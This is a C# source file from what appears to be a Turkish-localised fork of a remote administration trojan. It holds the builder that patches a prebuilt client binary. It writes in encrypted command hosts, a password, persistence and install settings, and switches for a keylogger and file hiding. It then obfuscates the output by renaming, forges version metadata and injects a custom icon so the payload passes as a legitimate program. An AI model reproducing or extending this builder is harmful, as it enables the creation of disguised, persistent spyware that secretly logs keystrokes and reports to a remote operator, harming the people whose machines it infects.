using System;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Vestris.ResourceLib;
using xServer.KuuhakuCekirdek.Kriptografi;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.KuuhakuCekirdek.Kurucu
{
    public static class ClientBuilder
    {
        public static void Build(KurulumAyarları options)
        {
            string encKey = DosyaYardımcısı.GetRandomFilename(20);
            AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "xClient.Ayarlar.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr")
                                {
                                    switch (strings)
                                    {
                                        case 1:
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Version, encKey);
                                            break;
                                        case 2: 
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.RawHosts, encKey);
                                            break;
                                        case 3: 
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Password, encKey);
                                            break;
                                        case 4: 
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallSub, encKey);
                                            break;
                                        case 5: 
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallName, encKey);
                                            break;
                                        case 6: 
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Mutex, encKey);
                                            break;
                                        case 7:
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.StartupName, encKey);
                                            break;
                                        case 8: 
                                            methodDef.Body.Instructions[i].Operand = encKey;
                                            break;
                                        case 9:
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Tag, encKey);
                                            break;
                                        case 10:
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.LogDirectoryName, encKey);
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") 
                                {
                                    switch (bools)
                                    {
                                        case 1: 
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Install));
                                            break;
                                        case 2: 
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Startup));
                                            break;
                                        case 3: 
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideFile));
                                            break;
                                        case 4: 
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Keylogger));
                                            break;
                                        case 5:
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideLogDirectory));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4")
                                {
                                 
                                    methodDef.Body.Instructions[i].Operand = options.Delay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s")
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(options.InstallPath);
                                }
                            }
                        }
                    }
                }
            }

            Renamer r = new Renamer(asmDef);

            if (!r.Perform())
                throw new Exception("renaming failed");
            r.AsmDef.Write(options.OutputPath);

            if (options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(options.OutputPath);

                versionResource.FileVersion = options.AssemblyInformation[7];
                versionResource.ProductVersion = options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[5];

                versionResource.SaveTo(options.OutputPath);
            }
            if (!string.IsNullOrEmpty(options.IconPath))
                IconInjector.InjectIcon(options.OutputPath, options.IconPath);
        }

        private static OpCode BoolOpcode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        private static sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFilesX86;
                case 3:
                    return (sbyte)Environment.SpecialFolder.SystemX86;
                default:
                    throw new ArgumentException("YüklemeDizini");
            }
        }
    }
}